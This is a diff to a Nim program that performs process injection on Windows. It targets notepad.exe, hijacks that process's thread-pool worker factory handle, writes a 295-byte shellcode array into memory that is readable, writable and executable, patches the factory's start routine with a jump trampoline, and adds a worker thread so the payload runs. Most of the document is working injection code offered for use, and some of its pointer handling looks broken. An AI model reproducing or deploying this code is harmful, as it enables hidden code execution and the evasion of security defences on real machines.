@@ -1,9 +1,7 @@
-import winim
-import defs
-import helpers
+include helpers
 
 
-var targetName = "explorer.exe"
+var targetName = "notepad.exe"
 
 var shellcode: array[295, byte] = [
 byte 0xfc,0x48,0x81,0xe4,0xf0,0xff,0xff,0xff,0xe8,0xd0,0x00,0x00,0x00,0x41,0x51,
@@ -35,6 +33,8 @@ var targetHandle = OpenProcess(
 
 var workerFactoryHandle = hijackProcessHandle(newWideCString("TpWorkerFactory"), targetHandle, WORKER_FACTORY_ALL_ACCESS)
 
+echo "Allocating + Writing shellcode"
+discard readLine(stdin)
 let rPtr = VirtualAllocEx(
         targetHandle,
         NULL,
@@ -42,7 +42,6 @@ let rPtr = VirtualAllocEx(
         MEM_COMMIT,
         PAGE_EXECUTE_READ_WRITE
     )
-
 var bytesWritten: SIZE_T
 let wSuccess = WriteProcessMemory(
     targetHandle, 
@@ -51,4 +50,39 @@ let wSuccess = WriteProcessMemory(
     cast[SIZE_T](shellcode.len),
     addr bytesWritten
 )
+echo "Shellcode address: " & $cast[int](rPtr).toHex
 
+var WorkerFactoryInformation: WORKER_FACTORY_BASIC_INFORMATION
+NtQueryInformationWorkerFactory(
+    workerFactoryHandle,
+    WorkerFactoryInfoClass.WorkerFactoryBasicInformation,
+    addr WorkerFactoryInformation,
+    cast[ULONG](sizeof(WorkerFactoryInformation)),
+    NULL
+    )
+
+
+var jmp = 0xe9
+var trampoline: PBYTE
+copyMem(addr trampoline, addr jmp, 1)
+copyMem((addr trampoline) + 1, unsafeAddr rPtr, sizeof(LPVOID))
+
+echo "writing trampoline to " & $cast[int](WorkerFactoryInformation.StartRoutine).toHex
+discard readLine(stdin)
+WriteProcessMemory(
+    targetHandle, 
+    WorkerFactoryInformation.StartRoutine,
+    addr trampoline,
+    sizeof(LPVOID) + 1,
+    addr bytesWritten
+)
+
+echo "Adding worker thread"
+discard readLine(stdin)
+var WorkerFactoryMinimumThreadNumber: ULONG = WorkerFactoryInformation.TotalWorkerCount + 1;
+NtSetInformationWorkerFactory(
+    workerFactoryHandle, 
+    WorkerFactoryInfoClass.WorkerFactoryThreadMinimum, 
+    addr WorkerFactoryMinimumThreadNumber, 
+    cast[ULONG](sizeof(ULONG))
+    )
